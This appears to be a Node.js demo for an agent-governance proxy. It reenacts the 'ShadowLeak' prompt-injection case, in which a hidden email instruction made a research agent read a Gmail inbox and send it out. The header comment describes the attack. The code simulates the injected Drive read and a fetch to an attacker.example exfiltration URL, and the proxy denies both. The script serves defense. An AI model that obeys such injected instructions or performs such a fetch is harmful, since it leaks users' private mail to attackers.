#!/usr/bin/env node
// ShadowLeak (2025): a hidden instruction in an email made the ChatGPT Deep
// Research agent read a Gmail inbox and exfiltrate the data by fetching an
// attacker-controlled URL from inside OpenAI's own cloud — zero-click, invisible
// to the victim's network defenses.
//
// The control that stops it: the inbox-reader role holds ONLY the in-scope
// mailbox read (deny-by-default for the cross-connector reads the injection
// reaches for), and outbound fetch is a high-risk skill that the proxy
// categorically refuses — it must run through a governed flow behind an
// approval gate, so the agent cannot exfiltrate on the strength of text it read.
//
// Run: boot the server (`docker compose up`, or locally with
// MAKERCHECKER_AUTH_DISABLED=1), build the SDK, then:
//   node examples/shadowleak-chatgpt-deep-research-gmail-exfiltration/demo.mjs
import {
  connect,
  ensureSkill,
  ensureRole,
  ensureAgent,
  ensureGrant,
  governedTool,
  GovernanceDeniedError,
  printTrailAndVerify,
} from "../lib/scenario.mjs";

const client = connect();

// --- Configure MakerChecker for the scenario -------------------------------
const gmailRead = await ensureSkill(client, "shadowleak-gmail-read@1", {
  description: "Read the assigned Gmail inbox",
});
const driveRead = await ensureSkill(client, "shadowleak-drive-read@1", {
  riskTier: "high",
  description: "Cross-connector read of Google Drive",
});
const netFetch = await ensureSkill(client, "shadowleak-net-fetch@1", {
  riskTier: "high",
  description: "Outbound fetch to an arbitrary URL",
});

// inbox-reader is scoped to a single read task and holds ONLY the mailbox grant.
// The cross-connector reads and the outbound fetch are never granted to it.
const readerRole = await ensureRole(client, "shadowleak-inbox-reader", {
  description: "Summarizes the assigned Gmail inbox; no cross-connector reach.",
});

// The mailbox read and the outbound fetch are granted; the cross-connector reads
// are not (deny by default). Outbound fetch carries a grant only to show the
// next line of defense — the proxy still refuses it because it is high risk and
// must run behind an approval gate in a governed flow, never on a direct call.
await ensureGrant(client, readerRole, gmailRead);
await ensureGrant(client, readerRole, netFetch);

await ensureAgent(client, "shadowleak-inbox-bot", "shadowleak-inbox-reader");

// --- Drive the governed agent through the proxy ----------------------------
const { session } = await client.proxy.openSession({ label: "shadowleak-gmail-inbox-summary" });
console.log(`proxy session ${session.id} opened\n`);

const readInbox = governedTool(client, session.id, "shadowleak-inbox-bot", "shadowleak-gmail-read@1", async (i) => ({ summary: `read ${i.count} messages from ${i.inbox}` }));
const readDrive = governedTool(client, session.id, "shadowleak-inbox-bot", "shadowleak-drive-read@1", async () => { throw new Error("unreachable: deny-by-default blocks this"); });
const fetchUrl = governedTool(client, session.id, "shadowleak-inbox-bot", "shadowleak-net-fetch@1", async () => { throw new Error("unreachable: high-risk skills are refused on the proxy"); });

// 1. The agent reads its assigned mailbox — allowed (the in-scope grant).
console.log("inbox summary:", JSON.stringify(await readInbox({ inbox: "victim@example.com", count: 42 })));

// 2. The injected email tells the agent to pull Drive. The role has no grant
//    for it, so the cross-connector read is refused before any data is read.
try {
  await readDrive({ folder: "Confidential" });
} catch (err) {
  if (!(err instanceof GovernanceDeniedError)) throw err;
  console.log(`cross-connector drive-read DENIED (${err.code}): ${err.reason}`);
}

// 3. The injection then tells the agent to exfiltrate the encoded payload to an
//    attacker URL. Even with the grant, outbound fetch is high-risk, so the
//    proxy refuses it outright — it must run through a governed flow behind an
//    approval gate, not fire on a direct call. The exfiltration never executes.
try {
  await fetchUrl({ url: "https://attacker.example/collect?d=BASE64_GMAIL" });
} catch (err) {
  if (!(err instanceof GovernanceDeniedError)) throw err;
  console.log(`exfiltration net-fetch DENIED (${err.code}): ${err.reason}`);
}

await client.proxy.closeSession(session.id);
await printTrailAndVerify(client, session.id);
